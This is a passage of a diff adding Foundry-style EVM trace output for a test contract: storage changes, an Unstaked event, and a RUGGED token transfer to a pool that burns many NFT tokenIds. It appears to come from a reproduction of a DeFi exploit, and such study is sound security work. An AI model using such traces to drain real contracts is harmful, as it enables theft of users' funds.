+    │   │   │   │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 0 → 1
+    │   │   │   │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 0 → 1
+    │   │   │   │   │   │   @ 0xfdf174c7dd773ceb59338a4850aebab780a089551be4d1567e31c3b936249f54: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x628ffba4f59d93f30437e0a4ea8df76d493cf66eb3b4ed5a05d19b676ee0cb6c: 1 → 0
+    │   │   │   │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x94a8cf0bb04cada668cac8fe79fcbdc89416b4b818137eeb9429f4142c9a5fa1: 503 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb430b: 1933 → 4810
+    │   │   │   │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 0 → 1
+    │   │   │   │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 0 → 1
+    │   │   │   │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 0 → 37
+    │   │   │   │   │   │   @ 0xd313cb391fd795c2f24f23d4c5ab78c35f3fcc17fc0e3bc375c8a0716813d89e: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x06e27794c2a28a3450f22775db35fca174966849125c0fab6ce40be469c36513: 1 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4747: 7485 → 4011
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606da: 4039 → 0
+    │   │   │   │   │   │   @ 0x819dc2753c6c1b094a15a83ca520f506b595b8450f895ee2bf396a80b8d24809: 504 → 0
+    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 20 → 40
+    │   │   │   │   │   │   @ 0xdd4f282511306f209855144bd2814eb654ac424d7ae74d2f50d0db148b069138: 1 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a7f: 4090 → 5676
+    │   │   │   │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 0 → 1
+    │   │   │   │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 0 → 1
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606cc: 9577 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4810: 8796 → 358
+    │   │   │   │   │   │   @ 0x5e1d27b2b1ec80d539268dd5fd93c3ad1dd343fb1bdc210539933f8db6ef97ea: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 0 → 32
+    │   │   │   │   │   │   @ 0x8afe8fc81dd1121ead501f49da883100bce05b9c66b86450094bcaabbf5389f5: 1 → 0
+    │   │   │   │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da5: 0 → 41
+    │   │   │   │   │   │   @ 0xba2c9d5d63b4586096d418b8bbaeb97a95e473f7b9268d72ef545e57508bfac9: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da6: 0 → 7485
+    │   │   │   │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 0 → 1
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db3: 0 → 4903
+    │   │   │   │   │   │   @ 0x6a9200ad53eee3cd59380e02d8525e3432018f590eac05632ad3da4f4d3ccb4b: 493 → 0
+    │   │   │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 0 → 23
+    │   │   │   │   │   │   @ 0xff97429c16330018304b3cd3ef5adff51d211e1d42cb960fe59b6ce826ca8039: 496 → 0
+    │   │   │   │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 0 → 21
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ce: 9848 → 0
+    │   │   │   │   │   │   @ 0x299e4f6b14df7238cfe515bb8f826305c002ee99e13d3a55ed61317e516c4eb4: 1 → 0
+    │   │   │   │   │   │   @ 0xb1bdd62affb33a1fdaaa9c1cb3cfe603cc501615bde360965dddaa7fb1630d88: 494 → 0
+    │   │   │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606de: 358 → 0
+    │   │   │   │   │   │   @ 0xf0fec72e7d502a3e794abb758325dc5ec8671d7111943fd8d2c20589e21e8b89: 501 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d1: 2314 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d3: 4574 → 0
+    │   │   │   │   │   │   @ 0xa20e3973e89279c9c33695d087f1bd3c86901a0f302b3838b1ee47742f565209: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x5064d72a0d09d607b5a0f36fb3fd48fcb48d158f2f29686611d6a7bc85687d87: 1 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d6: 5717 → 0
+    │   │   │   │   │   │   @ 0x5b68167d1efdaa8fed644c82e6506518ecd9bbe54fff55b98737c8ef74194730: 1 → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da8: 0 → 1933
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4311: 7093 → 5717
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dad: 0 → 3978
+    │   │   │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 0 → 34
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daf: 0 → 7449
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d8: 7637 → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb471b: 4903 → 643
+    │   │   │   │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 0 → 1
+    │   │   │   │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 0 → 25
+    │   │   │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 0 → 1
+    │   │   │   │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 0 → 1
+    │   │   │   │   │   │   @ 0x933688f4ca8bf55599f7d0385ff5c5c3b6817800c888b0e74578a790cfcfda7b: 1 → 0
+    │   │   │   │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 0 → 1
+    │   │   │   │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 513 → 493
+    │   │   │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 0 → 1
+    │   │   │   │   │   │   @ 0xc4c9f34e14fc4bf961f8a2d9b98ab2fe5cd3f23dd1374d1fa763d1c7faa9ff25: 1 → 0
+    │   │   │   │   │   │   @ 0x1185aefa921e778827cfc84d680a45c6e7684abdf4dbf0e0c7cf28ca9cd91bc0: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f68: 3270 → 9577
+    │   │   │   │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 0 → 1
+    │   │   │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 0 → 1
+    │   │   │   │   │   │   @ 0xbe5073a86d2a3a511f60296c79956c8bd2044f63caaca55ddc877401c827b002: 508 → 0
+    │   │   │   │   │   │   @ 0xbcbe385fce068003b1ddb1e0a9686ad1ea890d9a7cfd7b9e73f1cf2cc29aff4f: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
+    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 0 → 3270
+    │   │   │   │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 0 → 26
+    │   │   │   │   │   │   @ 0x871ea06dcb6d3876d4bd46e9dcb1555def501fada80b2cebb6cfa7dba5085a88: 498 → 0
+    │   │   │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   @ 0xf367aeb0eb7f2ba1fba0f21da71493632b960882782022912b6405e708fd562f: 1 → 0
+    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606df: 643 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Unstaked(caller: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], usdeReceived: 20000000000000000000 [2e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000001314fb37062980000 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
+    │   │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000001bc16d674ec80000 → 0
+    │   │   │   │   │   @ 3: 0x00000000000000000000000000000000000000000000001cf092e13e9a1869d1 → 0x00000000000000000000000000000000000000000000001bdb049b35864869d1
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc97: 0x0000000000000000000000000000000000000000000000000ee1d728ef291780 → 0x0000000000000000000000000000000000000000000000000174f810399b2c80
+    │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000000000000b596319c5 → 0x0000000000000000000000000000000000000000000000000000000c38b0d2d1
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [116880] RUGGED::transfer(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 22066000000000000000 [2.206e19])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4903)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8796)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 6049)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3913)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7449)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4984)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3978)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3525)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4090)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7093)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9017)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 1933)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9192)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7485)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 41)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3033)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 9050)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 347)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 8866)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 3270)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4945)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 7991)
+    │   │   │   ├─ emit ERC20Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], amount: 22066000000000000000 [2.206e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 23 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db1: 6049 → 0
+    │   │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 1 → 0
+    │   │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9f: 0 → 41
+    │   │   │   │   @ 0x8da61f0ba95efa75981093b7e981f31c2521cefb7e27bcc5d8d4ec9d256a89ec: 19 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db2: 8796 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da6: 7485 → 0
+    │   │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 1 → 0
+    │   │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 1 → 0
+    │   │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 37 → 0
+    │   │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da5: 41 → 0
+    │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db3: 4903 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9b: 0 → 9017
+    │   │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 28 → 0
+    │   │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 36 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db0: 3913 → 0
+    │   │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000122307adfba2f2fee0 → 0x0000000000000000000000000000000000000000000000135541dc1280b7fee0
+    │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e91: 0 → 4903
+    │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 22 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 4945 → 0
+    │   │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 34 → 0
+    │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 1 → 0
+    │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000000022c415d9bb221d200 → 0x000000000000000000000000000000000000000000000000fa072f84d45cd200
+    │   │   │   │   @ 5: 4321 → 4343
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 3270 → 0
+    │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9e: 0 → 7485
+    │   │   │   │   @ 0x48dd8d21eb66092b5011858cd63de145f4b1a9f5ca695c3ddfa8fa7b24091d97: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e99: 0 → 4090
+    │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daf: 7449 → 0
+    │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 30 → 0
+    │   │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 1 → 0
+    │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 24 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da3: 9050 → 0
+    │   │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9c: 0 → 1933
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dad: 3978 → 0
+    │   │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 1 → 0
+    │   │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dae: 4984 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dac: 3525 → 0
+    │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 40 → 18
+    │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 20 → 0
+    │   │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e95: 0 → 7449
+    │   │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 26 → 0
+    │   │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9a: 0 → 7093
+    │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 29 → 0
+    │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 8866 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea1: 0 → 9050
+    │   │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 31 → 0
+    │   │   │   │   @ 0xc8484a9c616cb67c27f593b48ffe54729d74cd0d1283a417af32248e41bfea2d: 1 → 0
+    │   │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 32 → 0
+    │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e93: 0 → 6049
+    │   │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 1 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 7991 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea6: 0 → 7991
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e94: 0 → 3913
+    │   │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea0: 0 → 3033
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e92: 0 → 8796
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daa: 7093 → 0
+    │   │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea2: 0 → 347
+    │   │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 1 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea5: 0 → 4945
+    │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dab: 4090 → 0
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da2: 347 → 0
+    │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea4: 0 → 3270
+    │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da8: 1933 → 0
+    │   │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0
+    │   │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 1 → 0
